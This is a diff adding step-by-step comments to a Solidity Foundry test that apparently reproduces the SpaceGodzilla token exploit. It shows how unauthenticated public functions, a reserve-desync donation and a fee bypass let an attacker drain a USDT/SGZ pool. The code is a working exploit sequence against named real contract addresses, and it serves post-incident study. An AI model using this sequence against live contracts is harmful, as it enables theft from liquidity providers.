@@ -39,6 +39,10 @@ address constant pool15 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;   // ANTEX
 address constant pool16 = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;   // DODO/WBNB Pool*/
 
 interface ISpaceGodzilla {
+    // VULNERABILITY: These two functions are the only external surface the attacker needs.
+    // They have no access-control modifiers in the implementation (see SpaceGodzilla.sol).
+    // Calling them from an arbitrary EOA (the attack contract) directly triggers
+    // reserve manipulation and liquidity addition that should have been internal only.
     function swapAndLiquifyStepv1() external;
     function swapTokensForOther(
         uint256 tokenAmount
@@ -78,20 +82,40 @@ contract AttackContract is Test {
         emit log_named_decimal_uint("[info] Attacker USDT Balance", init_capital, 18);
 
         // ========================================================
+        // EXPLOIT STEP 1: Call the unauthenticated public helper.
+        // swapTokensForOther(large) forces the SpaceGodzilla *contract itself* to sell a huge amount
+        // of its SGZ balance for USDT (routed via the warp helper). This moves the market price and
+        // updates the pair's recorded reserves (r0 becomes huge SGZ, r1 tiny USDT).
+        // Because swapTokensForOther is public, the attacker can trigger this sell at will.
         ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69_127_461_036_369_179_405_415_017_714);
         (uint256 r0, uint256 r1,) = Uni_Pair_V2(CakeLP).getReserves();
         assert(r0 == 76_041_697_635_825_849_047_705_725_848_735);
         assert(r1 == 90_478_604_689_102_338_898_952);
         // ========================================================
+        // EXPLOIT STEP 2: "Donate" (almost) the entire attacker USDT balance directly into the pair.
+        // This increases the *actual* USDT balance held by CakeLP, but does NOT call sync(),
+        // so the pair's internal reserves (r0/r1) remain the stale post-sell values from step 1.
+        // The excess balance will later allow the attacker to pull out far more tokens than the
+        // cached reserve suggests is safe.
         uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
         uint256 trans_usdt_balance = usdt_balance - 100_000;
         bool suc = IERC20(USDT).transfer(CakeLP, trans_usdt_balance);
         require(suc, "Transfer Failed");
         // ========================================================
+        // EXPLOIT STEP 3: Execute a large swap *out* of SGZ using the stale reserves.
+        // amount0Out ≈ r0 * 0.97. Because the pair sees the donated USDT as input (the transfer
+        // happened in the same tx), the swap succeeds and the attacker receives a massive amount
+        // of SGZ tokens. At this point the attacker holds most of the SGZ that was in the pool.
         uint256 amount0Out = r0 - (r0 * 30 / 1000);
         emit log_named_uint("First swap amount0Out", amount0Out);
         Uni_Pair_V2(CakeLP).swap(amount0Out, 0, address(this), ""); // 73,775,430,786,944,730,258,898,675,433,018 可能會變動，因為不知道攻擊者怎麼算3％手續費
         // ========================================================
+        // EXPLOIT STEP 4: Force the token contract to add liquidity using *its own* current balances.
+        // swapAndLiquifyStepv1() (public, no auth) reads the SGZ + USDT sitting in the SpaceGodzilla
+        // contract (accumulated fees + any prior operations) and calls addLiquidity(USDT, SGZ, ...).
+        // This sends both assets into the pair, *massively inflating both reserves* (r0 SGZ, r1 USDT).
+        // LP tokens go to _tokenOwner. The attacker now sees huge new reserves while still holding
+        // the SGZ they drained in step 3.
         ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();
         // ========================================================
         uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(this)); //  71,562,167,863,336,388,351,131,715,170,010 可能會變動，因為不知道攻擊者怎麼算3％手續費
@@ -100,15 +124,30 @@ contract AttackContract is Test {
         (r0, r1,) = Uni_Pair_V2(CakeLP).getReserves(); // 2,288,901,594,081,170,758,102,038,305,061     3,073,671,601,005,728,817,436,539
         assert(r1 == 3_073_671_601_005_728_817_436_539);
         // ========================================================
+        // EXPLOIT STEP 5 (setup for fee bypass): Send a tiny 20_000 wei of USDT to the pair.
+        // This makes balanceOf(USDT, CakeLP) > getReserves().r1 by > 1000.
+        // On the *next* transfer of SGZ to the pair, _isAddLiquidityV1() will return true.
         suc = IERC20(USDT).transfer(CakeLP, 20_000);
         require(suc, "Transfer Failed");
         // ========================================================
+        // EXPLOIT STEP 6: Return all acquired SGZ to the pair *fee-free*.
+        // Because of the dust USDT surplus + isAddLdx logic in _transfer:
+        //   - takeFee is forced to false
+        //   - no 3% goes to the contract
+        //   - no auto swapAndLiquify is triggered
+        // The attacker can therefore push the entire SGZ balance they hold into the pair
+        // without losing any to tax and without disturbing the newly-inflated reserves.
         suc = IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance); // Transfer 所有 SpaceGodzilla 給 LP
         require(suc, "Transfer Failed");
         // ========================================================
         uint256 LP_SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(CakeLP));
         emit log_named_uint("address(CakeLP) SpaceGodzilla_balance", LP_SpaceGodzilla_balance); // 73,851,069,457,417,559,109,233,753,475,071 可能會變動，因為不知道攻擊者怎麼算3％手續費
         // ========================================================
+        // EXPLOIT STEP 7: Drain the now-huge USDT reserve with a second swap.
+        // amount1Out ≈ r1 * 0.968. The attacker receives the overwhelming majority of the
+        // USDT that was just added by swapAndLiquifyStepv1 plus the earlier donation.
+        // Because the pair accounting was never honestly synchronized with the attack flow,
+        // the attacker extracts far more value than was ever legitimately supplied.
         uint256 amount1Out = r1 - (r1 * 32 / 1000);
         emit log_named_uint("First swap amount1Out", amount1Out); // 2,978,176,485,325,154,862,214,560
         Uni_Pair_V2(CakeLP).swap(0, amount1Out, address(this), "");
